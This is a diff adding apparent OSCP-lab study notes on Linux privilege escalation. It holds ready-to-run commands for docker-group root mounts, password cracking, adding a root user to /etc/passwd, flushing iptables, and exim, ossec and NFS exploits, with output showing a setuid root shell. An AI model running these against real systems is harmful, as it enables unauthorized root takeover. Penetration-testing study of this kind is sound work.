@@ -1,0 +1,142 @@
+# Privilege Escalation
+https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+# Steps
+1) Run linpeas.sh
+2) Check target specific files
+	sql servers
+	web files
+	configs
+	ssh keys
+3) Check log files
+	passwords
+	hints to interesting paths
+	bash history
+4) Kernel exploits
+
+
+# Docker
+# If root is running docker and we are part of the docker group, we can mount the root file system
+https://www.hackingarticles.in/docker-privilege-escalation/
+# 10.11.1.101 BREAK
+docker run -v /:/mnt -it alpine
+
+
+# Crack passwords
+unshadow passwd.txt shadow.txt > passwords.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
+john --show passwords.txt
+
+
+# Restricted shell
+https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
+https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/
+# 10.11.1.101 BREAK
+ssh alfred@10.11.1.101 -t "bash --noprofile"
+
+
+# /etc/passwd hash
+# if we can append this line to the /etc/passwd file, we can su into the juju user with root permissions
+echo "juju:$(openssl passwd -1 -salt juju password):0:0:root:/root:/bin/bash"
+juju:$1$juju$i0/cpD0NZw7kMpeXfVTja.:0:0:root:/root:/bin/bash
+
+
+# Kernel exploits
+# Run linux exploit suggester to find kernel exploits
+~/OSCP-labs/notes/linux/linux-exploit-suggester.sh -u "<uname -a>"
+
+
+# Port knocking
+# Check if /etc/knockd.conf is present on system
+https://www.digitalocean.com/community/tutorials/how-to-use-port-knocking-to-hide-your-ssh-daemon-from-attackers-on-ubuntu
+# 192.168.X.209 DC-9
+for x in 7469 8475 9842; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 192.168.106.209; done
+
+# iptables
+/sbin/iptables -F
+/sbin/iptables -X
+iptables -vnL
+Chain INPUT (policy ACCEPT 23 packets, 1692 bytes)
+ pkts bytes target     prot opt in     out     source               destination         
+
+Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
+ pkts bytes target     prot opt in     out     source               destination         
+
+Chain OUTPUT (policy ACCEPT 15 packets, 1856 bytes)
+ pkts bytes target     prot opt in     out     source               destination
+
+# pspy
+# unprivileged linux process snooping
+https://www.github.com/DominicBreuker/pspy
+./pspy64
+pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+2022/07/23 17:13:58 CMD: UID=1000 PID=999    | xfce4-panel --display :0.0 --sm-client-id 2dee910ae-71a9-4849-9623-047c08a0acc6                                                                                                      
+2022/07/23 17:13:58 CMD: UID=0    PID=900    | /usr/libexec/upowerd 
+2022/07/23 17:13:58 CMD: UID=0    PID=9      |
+
+# Search
+# Root owned, other writable files
+find / -type f -xdev -uid 0 -perm -o+w 2>/dev/null
+
+
+# Exploits
+# ossec
+# version 2.8 is vulnerable to https://www.exploit-db.com/exploits/35234
+# 10.11.1.71 ALPHA
+python 35234.py -c "/usr/bin/python3 /tmp/shell.py" &
+
+# exim
+# version 4.89 is vulnerable to https://www.exploit-db.com/exploits/46996
+# 192.168.X.195 DC-4
+$ ./46996.sh -m setuid
+
+raptor_exim_wiz - "The Return of the WIZard" LPE exploit
+Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>
+
+Preparing setuid shell helper...
+
+Delivering setuid payload...
+220 dc-4 ESMTP Exim 4.89 Sun, 10 Jul 2022 04:15:01 +1000
+250 dc-4 Hello localhost.offseclabs.com [::1]
+250 OK
+250 Accepted
+354 Enter message, ending with "." on a line by itself
+250 OK id=1oAEyr-0000XE-5D
+221 dc-4 closing connection
+
+Waiting 5 seconds...
+-rwsr-xr-x 1 root jim 7500 Jul 10 04:15 /tmp/pwned
+#
+
+# davfs2
+# vulnerable to https://www.exploit-db.com/exploits/28806, https://github.com/notclement/Automatic-davfs2-1.4.6-1.4.7-Local-Privilege-Escalation
+# 10.11.1.237 HUMBLE
+# add password to passwd.dav
+./exploit.sh
+
+# nfs
+# 10.1.1.27 MEGAN
+# check /etc/exports for nfs shares we can mount.  Looking for "insecure" and "no_root_squash"
+cat /etc/exports
+/srv/Share 10.1.1.0/24(insecure,rw)
+/srv/Share 127.0.0.1/32(no_root_squash,insecure,rw)
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+https://www.errno.fr/nfs_privesc.html
+https://github.com/sahlberg/libnfs
+~/OSCP-labs/notes/rpc/libnfs
